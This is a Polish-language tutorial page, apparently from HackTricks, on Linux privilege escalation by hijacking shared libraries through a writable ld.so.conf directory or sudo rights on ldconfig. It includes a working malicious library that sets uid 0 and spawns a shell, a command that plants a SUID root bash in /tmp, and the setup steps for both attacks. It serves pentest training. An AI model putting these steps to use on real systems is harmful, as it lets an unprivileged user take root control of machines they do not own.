# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

## Przygotuj środowisko

W poniższej sekcji możesz znaleźć kod plików, których użyjemy do przygotowania środowiska

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Utwórz** te pliki na swoim komputerze w tym samym folderze
2. **Skompiluj** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Skopiuj** `libcustom.so` do `/usr/lib` i odśwież cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Skompiluj** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Sprawdź środowisko

Sprawdź, czy _libcustom.so_ jest **ładowany** z _/usr/lib_ i czy możesz **wykonać** binary.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Przydatne komendy triage

Podczas ataku na prawdziwy cel, zweryfikuj **dokładną nazwę biblioteki**, której potrzebuje binarka, oraz to, co loader **aktualnie rozwiązuje**:
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
Kilka przydatnych pułapek:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` zwykle **nie działa**, ponieważ
przekierowanie jest wykonywane przez Twój bieżący shell. Użyj
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` zamiast tego.
- Binarne pliki **SUID/privileged** ignorują `LD_LIBRARY_PATH`/`LD_PRELOAD` w
**secure-execution mode**, ale katalogi pochodzące z `/etc/ld.so.conf` nadal są
częścią zaufanej konfiguracji loadera, więc ta błędna konfiguracja może
nadal wpływać na programy z uprawnieniami.
- W nowszych wersjach glibc dynamic loader udostępnia też
`--list-diagnostics`, co jest przydatne do debugowania rozwiązywania cache i
wyboru podkatalogu `glibc-hwcaps`, gdy hijack nie zachowuje się zgodnie z oczekiwaniami.

## Exploit

W tym scenariuszu załóżmy, że **ktoś utworzył podatny wpis** wewnątrz pliku w _/etc/ld.so.conf/_:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Wrażliwy folder to _/home/ubuntu/lib_ (gdzie mamy доступ do zapisu).\
**Pobierz i skompiluj** poniższy kod w tej ścieżce:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Jeśli oczekujesz, że **root** (lub inne uprzywilejowane konto) później uruchomi podatny binarny plik, zwykle lepiej jest zostawić **artifact należący do root** zamiast uruchamiać interaktywną powłokę. Na przykład:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Następnie, po wykonaniu uprzywilejowanego uruchomienia, możesz użyć `/tmp/rootbash -p`.

Teraz, gdy **utworzyliśmy złośliwą bibliotekę libcustom inside the misconfigured** path, musimy poczekać na **restart** albo na to, aż użytkownik root uruchomi **`ldconfig`** (_w przypadku gdy możesz uruchomić ten binarny plik jako **sudo** albo ma on **suid bit**, będziesz mógł uruchomić go samodzielnie_).

Gdy to się stanie, **sprawdź ponownie**, skąd executable `sharedvuln` ładuje bibliotekę `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Jak widać, jest **ładowane z `/home/ubuntu/lib`** i jeśli jakiś użytkownik je uruchomi, zostanie wykonany shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Zauważ, że w tym przykładzie nie eskalowaliśmy uprawnień, ale modyfikując wykonywane komendy i **czekając, aż root lub inny uprzywilejowany użytkownik uruchomi podatny binarny plik**, będziemy mogli eskalować uprawnienia.

### Other misconfigurations - Same vuln

W poprzednim przykładzie zasymulowaliśmy błędną konfigurację, w której administrator **ustawił folder bez uprawnień w pliku konfiguracyjnym w `/etc/ld.so.conf.d/`**.\
Ale istnieją też inne błędne konfiguracje, które mogą powodować tę samą podatność; jeśli masz **uprawnienia zapisu** w jakimś **pliku konfiguracyjnym** w `/etc/ld.so.conf.d`s, w folderze `/etc/ld.so.conf.d` lub w pliku `/etc/ld.so.conf`, możesz skonfigurować tę samą podatność i ją wykorzystać.

## Exploit 2

**Załóżmy, że masz uprawnienia sudo do `ldconfig`**.\
Możesz wskazać `ldconfig` **skąd ma wczytywać pliki conf**, więc możemy to wykorzystać, aby sprawić, by `ldconfig` wczytywał dowolne foldery.\
Więc utwórzmy pliki i foldery potrzebne do wczytania "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Teraz, jak wskazano w **poprzednim exploit**, **utwórz złośliwą bibliotekę w `/tmp`**.\
I na koniec załadujmy ścieżkę i sprawdźmy, skąd binarka ładuje bibliotekę:
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Jak widać, mając uprawnienia sudo do `ldconfig`, możesz wykorzystać tę samą podatność.**



## References

- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
{{#include ../../banners/hacktricks-training.md}}
